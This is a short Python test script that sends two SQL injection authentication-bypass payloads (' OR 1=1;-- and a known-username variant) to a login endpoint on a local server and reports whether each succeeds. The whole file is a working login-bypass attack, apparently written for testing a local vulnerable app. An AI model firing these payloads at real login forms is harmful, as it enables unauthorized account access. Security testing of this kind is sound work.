import requests

def test_sql_injection(payload: dict):
    url = "http://127.0.0.1:5000/user/login"
    res = requests.post(url, data=payload)
    if res.status_code == 200:
        print(f"Successfully Executed SQL Injection using payload:\n{str(payload)}")
        print(f"Result:\n{res.text}")
    else:
        print(f"Could not execute SQL Injection using payload:\n{str(payload)}")
        print(f"Status: {res.status_code}\nBody:\n{res.text}")

def test_sql_injection_cases():
    payloads = [
        # Without knowing a username
        {
            'username': "' OR 1=1;--",
            'password': ""
        },
        # Known username:
        {
            'username': "alice' AND 1=1;--",
            'password': ""
        },
    ]
    for payload in payloads:
        test_sql_injection(payload)



if __name__ == "__main__":
    test_sql_injection_cases()